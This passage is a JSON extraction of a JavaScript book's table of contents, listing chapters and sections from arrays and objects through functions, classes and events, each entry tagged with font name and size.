        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.29: Logical connective of values   108",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.30: Checking if an object is an Array   108",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.31: Insert an item into an array at a speci\ufb01c index   109",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.32: Sorting multidimensional array   109",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.33: Test all array items for equality   110",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.34: Copy part of an Array   110",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 13: Objects   112",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.1: Shallow cloning   112",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.2: Object.freeze   112",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.3: Object cloning   113",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.4: Object properties iteration   114",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.5: Object.assign   115",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.6: Object rest/spread (...)   116",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.7: Object.de\ufb01neProperty   116",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.8: Accesor properties (get and set)   117",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.9: Dynamic / variable property names   117",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.10: Arrays are Objects   118",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.11: Object.seal   119",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.12: Convert object's values to array   120",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.13: Retrieving properties from an object   120",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.14: Read-Only property   123",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.15: Non enumerable property   123",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.16: Lock property description   123",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.17: Object.getOwnPropertyDescriptor   124",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.18: Descriptors and Named Properties   124",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.19: Object.keys  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... 126",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.20: Properties with special characters or reserved words   126",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.21: Creating an Iterable object   127",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.22: Iterating over Object entries - Object.entries()   127",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 13.23: Object.values()   128",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 14: Arithmetic (Math)   129",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.1: Constants   129",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.2: Remainder / Modulus (%)   129",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.3: Rounding   130",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.4: Trigonometry   132",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.5: Bitwise operators   133",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.6: Incrementing (++)   135",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.7: Exponentiation (Math.pow() or **)   135",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.8: Random Integers and Floats   136",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.9: Addition (+)   137",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.10: Little / Big endian for typed arrays when using bitwise operators   137",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.11: Get Random Between Two Numbers   138",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.12: Simulating events with di\ue023erent probabilities   139",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.13: Subtraction (-)   140",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.14: Multiplication (*)   140",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.15: Getting maximum and minimum   140",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.16: Restrict Number to Min/Max Range   141",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.17: Ceiling and Floor   141",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.18: Getting roots of a number   142",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.19: Random with gaussian distribution   142",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.20: Math.atan2 to \ufb01nd direction   143",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.21: Sin & Cos to create a vector given direction & distance   143",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.22: Math.hypot   144",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.23: Periodic functions using Math.sin   145",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.24: Division (/)   146",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.25: Decrementing (--)   146",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 15: Bitwise operators   148",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 15.1: Bitwise operators   148",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 15.2: Shift Operators   150",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 16: Constructor functions   151",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 16.1: Declaring a constructor function   151",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 17: Declarations and Assignments   152",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.1: Modifying constants   152",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.2: Declaring and initializing constants   152",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.3: Declaration   152",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.4: Unde\ufb01ned   153",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.5: Data Types   153",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.6: Mathematic operations and assignment   153",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 17.7: Assignment   155",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 18: Loops   156",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ..................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.1: Standard \"for\" loops   156",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.2: \"for ... of\" loop   157",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.3: \"for ... in\" loop   159",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.4: \"while\" Loops   159",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.5: \"continue\" a loop   160",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.6: Break speci\ufb01c nested loops  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................... 161",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.7: \"do ... while\" loop   161",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 18.8: Break and continue labels   161",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 19: Functions   163",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ............................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.1: Function Scoping   163",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.2: Currying   164",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.3: Immediately Invoked Function Expressions   165",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.4: Named Functions   166",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.5: Binding `this` and arguments   169",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.6: Functions with an Unknown Number of Arguments (variadic functions)   171",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.7: Anonymous Function   172",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.8: Default parameters   174",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.9: Call and apply   176",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.10: Partial Application   177",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.11: Passing arguments by reference or value   178",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.12: Function Arguments, \"arguments\" object, rest and spread parameters   179",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.13: Function Composition   179",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.14: Get the name of a function object   180",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.15: Recursive Function   180",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.16: Using the Return Statement   181",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.17: Functions as a variable   182",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 20: Functional JavaScript   185",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 20.1: Higher-Order Functions   185",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ...................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 20.2: Identity Monad   185",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 20.3: Pure Functions   187",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 20.4: Accepting Functions as Arguments   188",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 21: Prototypes, objects   190",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ........................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 21.1: Creation and initialising Prototype   190",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ..................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 22: Classes   192",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.1: Class Constructor   192",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.2: Class Inheritance   192",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.3: Static Methods   193",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.4: Getters and Setters   193",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.5: Private Members   194",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.6: Methods   195",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.7: Dynamic Method Names   195",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.8: Managing Private Data with Classes   196",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 22.9: Class Name binding   198",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ........................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 23: Namespacing   199",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 23.1: Namespace by direct assignment   199",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 23.2: Nested Namespaces   199",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .......................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 24: Context (this)   200",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " .................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 24.1: this with simple objects   200",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ....................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 24.2: Saving this for use in nested functions / objects   200",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ............................................................................ ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 24.3: Binding function context   201",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 24.4: this in constructor functions   202",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " .............................................................................................................. ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 25: Setters and Getters   203",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ...................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 25.1: De\ufb01ning a Setter/Getter Using Object.de\ufb01neProperty   203",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 25.2: De\ufb01ning an Setter/Getter in a Newly Created Object   203",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 25.3: De\ufb01ning getters and setters in ES6 class  ",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " ......................................................................................... 203",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 26: Events   205",
        "font_name": "Quicksand-Bold",
        "font_size": 12,
        "img": []
    },
    {
        "text": " ................................................................................................................................................... ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 26.1: Page, DOM and Browser loading   205",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
